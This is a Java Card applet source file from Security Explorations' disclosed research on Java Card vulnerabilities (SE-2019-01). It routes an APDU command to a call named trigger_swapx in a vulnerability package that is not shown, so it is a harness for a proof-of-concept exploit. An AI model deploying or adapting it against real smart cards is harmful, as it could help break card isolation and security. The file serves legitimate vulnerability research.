/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* RESEARCH MATERIAL:	SE-2019-01                                            */
/* Security vulnerabilities in Java Card                                      */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

package com.se.applets;

import javacard.framework.*;
import com.se.vulns.*;

public class SEApplet extends Applet {
    private final static byte SEApplet_CLA      = (byte)0x80;

    private final static byte TRIGGER_SWAPX     = (byte)0x10;

    protected SEApplet() {       
      register();
    }

    public static void install(byte[] bArray, short bOffset, byte bLength) {
      new SEApplet();
    }

    public byte[] get_req(APDU apdu,short size) {
      byte[] buffer=apdu.getBuffer();

      byte numBytes=buffer[ISO7816.OFFSET_LC];
      byte byteRead=(byte)(apdu.setIncomingAndReceive());

      if ((numBytes!=size)||(byteRead!=size)) {
        ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
      }

      return buffer;
    }

    public void send_resp(APDU apdu,short size) {
      short availBytes=apdu.setOutgoing();

      if (availBytes<size) {
       ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
      }

      apdu.setOutgoingLength((byte)size);
      apdu.sendBytes((short)5,(short)size);
    }

    public void trigger_swapx(APDU apdu) {
     byte buf[]=get_req(apdu,(short)1);

     Test.trigger_swapx();

     short dummy=0x1234;

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void process(APDU apdu) {
      byte[] buffer=apdu.getBuffer();

      if (buffer[ISO7816.OFFSET_CLA]!=SEApplet_CLA) {
       ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
      }

      switch (buffer[ISO7816.OFFSET_INS]) {
        case TRIGGER_SWAPX:
         trigger_swapx(apdu);
         return;
        default:
         ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
      }
    }
}
